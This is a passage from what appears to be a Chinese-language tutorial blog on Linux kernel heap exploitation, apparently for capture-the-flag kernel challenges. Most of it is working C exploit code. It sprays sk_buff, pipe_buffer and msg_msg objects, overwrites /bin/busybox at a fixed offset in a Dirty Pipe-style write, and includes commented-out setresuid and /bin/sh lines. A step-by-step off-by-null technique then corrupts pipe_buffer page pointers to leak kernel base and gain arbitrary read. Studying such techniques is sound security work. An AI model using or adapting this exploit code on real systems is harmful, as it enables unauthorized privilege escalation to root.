</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">build_msg</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;init pipe buffer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x40</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;spray some objects&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x160</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add_only</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;free objects now this page will back to buddy system&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x160</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">del</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;spary some sk-buffer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x9</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">obj_idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x160</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">show</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// hexdump(buf,0x10);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x6161616161616161</span> <span class="o">&amp;&amp;</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="o">!=</span> <span class="mh">0xffff</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;get[%d]&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">obj_idx</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="n">obj_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">skb_idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x61</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;get skb idx %d&#34;</span><span class="p">,</span><span class="n">skb_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">change_pipe_buff_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;Dirty pipe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">attack_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">attack_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">loff_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x1FDAC8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">splice_fd</span><span class="p">(</span><span class="n">attack_fd</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">show_skb_buff</span><span class="p">(</span><span class="n">skb_idx</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">hexdump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="mh">0x9</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">attack_data</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">attack_data</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//avoid pipe_buffer and sk-buffer in same object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">release_pipe_buff</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">msgbuf</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add_msg</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">msgbuf</span><span class="p">,</span><span class="mh">0x200</span><span class="o">-</span><span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// __pause(&#34;debug&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">cid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">wstatus</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="n">wstatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">WIFEXITED</span><span class="p">(</span><span class="n">wstatus</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">WEXITSTATUS</span><span class="p">(</span><span class="n">wstatus</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// setresuid(0, 0, 0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// execl(&#34;/bin/sh&#34;, &#34;sh&#34;, NULL);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Q: 假设不能用 show 还能做吗
A: OF COURSE</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"></code></pre></td></tr></table>
</div>
</div><h2 id="off-by-null">off by null</h2>
<h3 id="独立页的-off-by-null-kmalloc-0x200">独立页的 off by null (kmalloc-0x200)</h3>
<h4 id="前置知识">前置知识</h4>
<p>page 申请的时候是从高地址向低地址申请的 (从下往上)</p>
<p>例如第一个页的地址是 0xffff8880081a9000 那第二个页的地址就是 0xffff8880081a8000, 依次类推</p>
<p>对于页的调试可以 <code>b __get_free_pages</code></p>
<p>然后 b 第一个地址</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-584.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-584.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-584.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-584.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-584.png"
        title="image-20240204015435221" /></p>
<h4 id="漏洞利用">漏洞利用</h4>
<p>可以看到 512 大小的堆块属于 order-0 的页面 1 = 2^0</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-585.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-585.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-585.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-585.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218002622-585.png"
        title="image-20240204020151763" /></p>
<ol>
<li>首先申请一些页, 以及对 pipe_buffer 进行初始化</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">page_fds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">30</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">spray_pags</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;Spray 0x10 order-0 page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">page_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">pagealloc_pad</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">determine_spray</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;spray determine page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">spray_pags</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>然后释放掉 page-0 申请一些 pipe_buffer, 由于默认的 pipe_buffer 的大小是(0x10*0x28) = 属于 kmalloc-cg-1k 的页</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">page_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="c1">//high page
</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>因此需要使用 F_SETPIPE_SZ 将大小修改为 512 的大小</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x62&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">fcntl</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">F_SETPIPE_SZ</span><span class="p">,</span><span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">/</span><span class="mh">0x40</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span><span class="c1">//order-0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fcntl&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span><span class="c1">//设置特征值用来后续确定是哪个 page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span><span class="c1">//init page struct addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="4">
<li>释放掉 page-1, 然后申请一些漏洞堆块</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">page_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="c1">//low page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add_only</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span><span class="c1">//order-0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="5">
<li>触发漏洞 off by null, 修改 pipe_buffer 的 page 结构题指针 如果修改成功此时应该会使得两个 pipe_buffer 的 page 指向同一个页</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">edit</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x201</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="6">
<li>接下来我们可以通过根据内容特征来判断哪两个 pipe_buffer 指向了同一个 page</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="sc">&#39;\x00&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">s1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">hexdump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">s1</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">s2</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="7">
<li>
<p>如果找到了两个 page 指向了同一个页，我们可以 free 掉其中一个页（s1），然后喷射一些 order-0 的 pipe buffer 以此来占位 free 的 order-0 的页, 那么此时我们可以通过读取 s2 的内容来获取该页的值 从而 leak 出 vmemmap_base (page 结构体基地址)以及 kernel base</p>
<p>同时我们也可以不断的修改 page 结构体的值来做到任意地址读</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">//free order-0 page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">release_pipe_buff</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//allocate order-0 page use pipe buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">fcntl</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">F_SETPIPE_SZ</span><span class="p">,</span><span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">/</span><span class="mh">0x40</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fcntl&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
